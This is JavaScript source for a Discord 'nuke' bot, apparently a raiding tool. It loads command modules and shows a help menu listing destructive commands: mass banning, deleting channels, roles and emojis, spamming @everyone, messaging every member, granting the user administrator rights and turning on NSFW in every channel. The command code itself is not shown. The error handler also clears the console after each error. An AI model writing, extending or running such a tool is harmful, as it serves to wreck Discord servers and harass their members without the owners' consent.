const fs = require("fs");
const path = require("path");
const Discord = require("discord.js");
const config = require("./config.json");
const client = new Discord.Client();

client.commands = new Discord.Collection();


function handleError(error) {
    const errorMessage = `[ERROR] ${new Date().toLocaleTimeString()} - ${error.message}`;
    console.error(errorMessage);
    setTimeout(() => process.stdout.write('\x1Bc'), 5000);
}
process.on('uncaughtException', handleError);


const commandFiles = fs.readdirSync(path.join(__dirname, 'commands')).filter(file => file.endsWith('.js'));
for (const file of commandFiles) {
    const command = require(`./commands/${file}`);
    client.commands.set(command.name, command);
}

client.once("ready", () => {
  console.log(`[CONSOLA]: bot started as: ${client.user.username}`);
  
  
  client.user.setPresence({
    activity: {
      name: '#Unexpected',
      type: 'STREAMING',
      url: 'https://twitch.tv/Unexpected'
    },
    status: 'online'
  });
});

client.on("message", async message => {
    if (message.author.bot) return;

    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    const commandName = args.shift().toLowerCase();

    if (!client.commands.has(commandName)) return;

    const command = client.commands.get(commandName);

    try {
        await command.execute(message, args);
    } catch (error) {
        console.error(error);
        message.reply('hubo un error intentando ejecutar el comando');
    }
});

client.on('message', message => {
    if (message.author.bot) return;

    if (message.content === '.help') {
        const embed1 = new Discord.MessageEmbed()
            .setColor('#5D3FD3')
            .setTitle('All the Commands Loaded[26/27]')
            .setURL('https://discord.gg/86N2qMVX7Z')
            .addFields(
                { name: 'INFO', value: `
                    \`.help\` - help command.
                    \`.invite\` - Command of the bot invite.
                `, inline: false }
            )
            .setImage('https://cdn.discordapp.com/attachments/1249070026581999790/1257123589123997766/desktop-wallpaper-minimalism-noname-minimalist-aesthetic-dark-minimalist.webp');

        const embed2 = new Discord.MessageEmbed()
            .setColor('#5D3FD3')
            .setTitle('NUKE Commands')
            .setDescription(`
                \`.mass_channels\` - Add channels on the server (50)
                \`.mass_roles\` - Add roles on the server (50)
                \`.mass_kick\` - Delete roles on the server
                \`.admin\`- Gives you a role with administrator permissions
                \`.bypass\` - Server-wide bypass
                \`.change\`- Change avatar & name of the server
                \`.nuke\`- Delete channels in the server
                \`.editch\` - Server-wide bypass (editch all channels)
                \`.massban\`- Ban all in the server
                \`.prune\`- Prune + 1-day inactive members
                \`.unbanall\`- Unban all users
                \`.online_massban\` - Ban active users
                \`.server_lockdown\` - Lock server
                \`.spam\` - Spam @everyone all
                \`.msgall\` - Sends message to all server users
                \`.on\` - Fuck The server
                \`.nsfw_all\` - Activate NSFW
                \`.mass_roles\` - Create roles
                \`.mass_mute\` - Mute everyone
                \`.mass_rename_roles\` - Rename all roles
                \`.leave\` - Bot exit the server
                \`.delete_roles\` - Clear roles
                \`.delete_emojis\` - Clear emojis
            `)
            .setImage('https://cdn.discordapp.com/attachments/1249070026581999790/1257123589123997766/desktop-wallpaper-minimalism-noname-minimalist-aesthetic-dark-minimalist.webp');

        const embed3 = new Discord.MessageEmbed()
            .setColor('#5D3FD3')
            .setTitle('Credits')
            .setDescription(`
                - \`Mendry\` - Desarrollador de todo el bot
                - \`s1lent\` - Encargado de dar ideas
                - \`s2\` - Creó los comandos unbanall y server lockdown
            `);

        message.channel.send(embed1)
            .then(() => message.channel.send(embed2))
            .then(() => message.channel.send(embed3))
            .catch(error => console.error('Error sending message:', error));
    }
});

client.login(config.token);